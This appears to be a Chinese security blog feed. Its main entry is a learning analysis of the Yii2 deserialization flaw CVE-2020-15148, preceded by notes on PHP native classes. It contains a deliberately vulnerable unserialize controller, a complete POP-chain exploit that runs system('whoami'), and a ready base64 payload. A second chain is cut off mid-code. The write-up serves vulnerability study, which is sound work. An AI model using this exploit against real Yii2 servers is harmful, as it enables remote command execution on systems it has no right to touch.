archive.</p><ul><li><strong><code>ZipArchive::OVERWRITE</code></strong>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。</li><li><strong><code>ZipArchive::CREATE</code></strong>：如果不存在则创建一个zip压缩包。</li><li><strong><code>ZipArchive::RDONLY</code></strong>：只读模式打开压缩包。 <code>PHP&gt;7.4.3, PECL zip&gt;1.17.1</code></li><li><strong><code>ZipArchive::EXCL</code></strong>：如果压缩包已经存在，则出错。</li><li><strong><code>ZipArchive::CHECKCONS</code></strong>：对压缩包执行额外的一致性检查，如果失败则显示错误。</li></ul><p><strong>Demo</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt'</span><span class="token punctuation">,</span><span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>目录下的<code>1.txt</code>将会被删除</p><h3 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h3><p>注释读取</p><p><strong>range</strong>：<code>(PHP 5, PHP 7, PHP 8)</code></p><p>方法参考：<a href="https://www.php.net/manual/zh/book.reflection.php">https://www.php.net/manual/zh/book.reflection.php</a></p><p><strong>Example Class</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Apple</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$var2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Orange'</span><span class="token punctuation">;</span>    <span class="token comment">/**     * This is DocComment     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Apple'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>利用php反射类来进行操作</p><p><code>ReflectionMethod</code>继承<code>ReflectionFunctionAbstract</code>这个抽象类，这个抽象类实现<code>Reflector</code>接口</p><p><code>ReflectionFunctionAbstract</code>中有一个<code>getDocComment</code>方法，用以获取函数的注释文本，注释文本需符合<code>/**</code>开头的规范否则无法识别</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$ref</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionMethod</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Apple"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ref</span><span class="token operator">-></span><span class="token function">getDocComment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"/**     * This is DocComment     */"</span></code></pre><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">php反序列化从入门到放弃(入门篇)</a></li><li><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></li><li><a href="https://www.anquanke.com/post/id/238482">PHP 原生类在 CTF 中的利用</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Class-Found&quot;&gt;&lt;a href=&quot;#Class-Found&quot; class=&quot;headerlink&quot; title=&quot;Class Found&quot;&gt;&lt;/a&gt;Class Found&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;php中含魔术方法的内置类&lt;/strong&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="xxe" scheme="https://www.extrader.top/tags/xxe/"/>
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="ssrf" scheme="https://www.extrader.top/tags/ssrf/"/>
    
      <category term="xss" scheme="https://www.extrader.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Yii2反序列化漏洞(CVE-2020-15148)分析学习</title>
    <link href="https://www.extrader.top/posts/c79847ee/"/>
    <id>https://www.extrader.top/posts/c79847ee/</id>
    <published>2021-05-13T13:22:30.000Z</published>
    <updated>2021-05-21T14:16:25.040Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Yii2介绍"><a href="#Yii2介绍" class="headerlink" title="Yii2介绍"></a>Yii2介绍</h3><p>Yii 是一个高性能，基于组件的 PHP 框架，用于快速开发现代 Web 应用程序。即可以用于开发各种用 PHP 构建的 Web 应用。因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统（CMS）、 电子商务项目和 RESTful Web 服务等。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>Yii2 &lt; 2.0.38</li></ul><p>2.0.38已修复，官方给<code>yii\db\BatchQueryResult</code>类加了一个<code>__wakeup()</code>函数，<code>__wakeup</code>方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当BatchQueryResult类被反序列化时就直接报错，避免反序列化的发生，也就避免了漏洞。</p><ul><li><a href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511165809784.png" alt loading="lazy"></p><h3 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h3><p>直接上<code>github</code>将app下载下来解压</p><ul><li><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></li></ul><p>本地web环境使用<code>phpstudy</code>集成环境搭建，使用<code>phpstorm</code>进行<code>xdebug</code>调试</p><p>php version：7.4.3nts，Apache version：2.4.39</p><p>修改<code>config\web.php</code>中的<code>cookieValidationKey</code>为任意值，作为<code>yii\web\Request::cookieValidationKey</code>的加密值，不设置会报错</p><p>接着自己添加一个<code>controller</code>来进行漏洞的利用，创建一个action：<a href="http://url/index.php?r=test/test">http://url/index.php?r=test/test</a>, controllers的命名是： <code>名称Controller</code>，action的命名是： <code>action名称</code>，如下</p><p><code>controllers/TestController.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controllers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">TestController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">actionTest</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>发包测试，环境搭建成功</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511191942698.png" alt loading="lazy"></p><h3 id="CVE漏洞分析"><a href="#CVE漏洞分析" class="headerlink" title="CVE漏洞分析"></a>CVE漏洞分析</h3><h4 id="POP1"><a href="#POP1" class="headerlink" title="POP1"></a>POP1</h4><p>从<code>yii\db\BatchQueryResult</code>这个类入手，提起主要代码分析：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// make sure cursor is closed</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">!==</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_batch</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_value</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_key</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>可以看到，<code>__destruct</code>调用了<code>reset</code>方法<code>reset</code>调用了<code>close</code>方法，参数<code>_dataReader</code>可控，学习思路后知道这里可以通过触发<code>__call</code>方法来进行利用</p><ul><li><code>__call</code>：当一个对象在对象上下文中调用不可访问的方法时触发 </li></ul><p>当一个对象调用不可访问的<code>close</code>方法或者类中压根就没有<code>close</code>方法，即可触发<code>__call</code>，全局搜索<code>__call</code>方法</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511200257237.png" alt loading="lazy"></p><p>找到其中一个<code>Faker/Generator.php</code>类，跟进查看代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$attributes</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">format</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFormatter</span><span class="token punctuation">(</span><span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">providers</span> <span class="token keyword">as</span> <span class="token variable">$provider</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$provider</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token variable">$formatter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>InvalidArgumentException</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unknown formatter "%s"'</span><span class="token punctuation">,</span> <span class="token variable">$formatter</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>__call</code>方法调用了类中的<code>format</code>方法，<code>format</code>方法里的<code>call_user_func_array</code>里的参数调用了<code>getFormatter</code>方法</p><ul><li><p><code>call_user_func_array</code>：调用回调函数，并把一个数组参数作为回调函数的参数</p><p>大致使用方法如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">foobar</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token constant">__FUNCTION__</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" got <span class="token interpolation"><span class="token variable">$arg</span></span> and <span class="token interpolation"><span class="token variable">$arg2</span></span>\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">foo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">bar</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">,</span> <span class="token variable">$arg2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token constant">__METHOD__</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" got <span class="token interpolation"><span class="token variable">$arg</span></span> and <span class="token interpolation"><span class="token variable">$arg2</span></span>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Call the foobar() function with 2 arguments</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"foobar"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"one"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"two"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Call the $foo->bar() method with 2 arguments</span><span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">foo</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"bar"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"three"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"four"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li></ul><p><code>getFormatter</code>方法从<code>$this-&gt;$formatter</code>中取值，<code>$this-&gt;formatter</code>可控，所以这里可以调用任意类中的任意方法了。Debug如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511203202841.png" alt loading="lazy"></p><p>但是<code>$arguments</code>是从<code>yii\db\BatchQueryResult::reset()</code>里传过来的，我们不可控，比如这里就为空，因为传来的<code>close</code>方法中参参数值，所以我们只能不带参数地去调用别的类中的方法。</p><p>到这一步就需要一个执行类，这时需要类中的方法需要满足两个条件</p><ol><li>方法所需的参数只能是其自己类中存在的（即参数：<code>$this-&gt;args</code>）</li><li>方法需要有命令执行功能</li></ol><p>通过全局查找正则匹配<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>来查找，结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511203624162.png" alt loading="lazy"></p><ul><li><p><code>call_user_func</code>：把第一个参数作为回调函数调用,这里用<code>call_user_func</code>即可达到命令执行的效果也可以达到<code>RCE</code>的效果</p><p>大致使用方法如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">increment</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$var</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'increment'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'increment'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// You can use this instead before PHP 5.3</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li></ul><p>其中有两个类中的<code>run</code>方法可用</p><ol><li><p><code>yii\rest\CreateAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">...</span><span class="token operator">...</span>        <span class="token keyword">return</span> <span class="token variable">$model</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>\yii\rest\IndexAction::run()</code>，<code>$this-&gt;checkAccess, $this-&gt;id</code>两个参数可控</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">prepareDataProvider</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><p>于是即可构造完整的<code>pop</code>链</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name class-name-fully-qualified static-context">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context">Faker<span class="token punctuation">\</span>Generator</span><span class="token operator">::</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token operator">::</span><span class="token constant">run</span><span class="token operator">-></span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>           <span class="token comment">//command</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'close'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">IndexAction</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BatchQueryResult</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>命令执行结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2020-15148)%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20210511204922226.png" alt loading="lazy"></p><h4 id="POP2"><a href="#POP2" class="headerlink" title="POP2"></a>POP2</h4><p>还是从<code>yii2/db/BatchQueryResult.php</code>入手，换种思路，我们不找<code>__call</code>方法来触发，直接找<code>close</code>方法</p><p>随后我们找到一个<code>FnStream.php</code>在<code>vendor\guzzlehttp\psr7\src</code>目录下，代码如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_fn_close</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>$this-&gt;_fn_close</code>可控</p><p>Exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token 